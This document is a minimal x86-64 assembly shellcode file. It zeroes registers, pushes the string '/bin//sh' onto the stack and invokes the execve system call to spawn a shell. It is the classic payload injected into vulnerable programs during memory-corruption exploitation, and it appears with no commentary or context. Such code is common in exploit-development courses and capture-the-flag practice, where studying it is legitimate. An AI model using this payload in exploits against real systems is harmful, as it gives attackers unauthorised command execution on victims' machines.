BITS 64
GLOBAL _start
_start:

xor rax,rax
xor rdx,rdx

push rax
mov rbx,`/bin//sh`
push rbx
mov rdi,rsp
push rax
push rdi
mov rsi,rsp
mov al,0x3b
syscall